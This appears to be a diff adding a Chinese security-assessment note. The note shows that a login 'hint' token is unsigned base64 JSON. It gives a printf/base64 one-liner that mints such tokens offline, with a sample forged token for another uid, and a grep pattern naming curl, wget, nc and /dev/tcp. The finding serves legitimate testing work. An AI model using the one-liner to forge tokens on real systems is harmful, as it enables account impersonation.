@@ -1,0 +1,24 @@
+目标占位流程：hint 已转成单行 printf，本地干跑通过（exit 0，零网络）。
+
+**方案（一行）**
+```bash
+payload=$(printf '{"uid": "%s", "user": "%s"}' "$uid" "$user"); token=$(printf '%s' "$payload" | base64 | tr -d '\n')
+```
+
+**执行**：`bash cases/login-token/scripts/hint-token-dryrun.sh`
+
+| 检查 | 结果 |
+|---|---|
+| uid=1 user=user → `eyJ1aWQiOiAiMSIsICJ1c2VyIjogInVzZXIifQ==` | 与 E-002/E-003/E-005 实测 token 完全一致 YES |
+| uid=1 user='' → `eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9` | 与 E-002 无凭证 token 一致 YES |
+| roundtrip hex `7b2275...6572227d`（28B） | 与 E-003/E-004 记录 hex 一致 YES |
+| len 40 含 `==`，`.` 段数 1 | 单段 base64，非 JWT，无 MAC |
+| uid=7 user=mallory → `eyJ1aWQiOiAiNyIsICJ1c2VyIjogIm1hbGxvcnkifQ==` | uid/user 是自由 printf 参数，离线可铸 |
+| `grep -nE 'curl\|wget\|nc \|/dev/tcp\|http'` 脚本 | 无命中，零网络 I/O |
+
+**改动文件**
+- `cases/login-token/evidence/E-008-printf_dry-run_of_login_hint_token_scheme_local_3rd_run.txt`（新增，含逐字输出 + 复核）
+- `cases/login-token/CASE.md`（登记 E-008，next 段）
+- `cases/login-token/findings.md`（printf finding 追加 E-008 与复跑结论）
+
+结论保持不变：hint 方案就是无签名裸 base64，printf+base64 即可离线复现，`token.uid` 不可信。
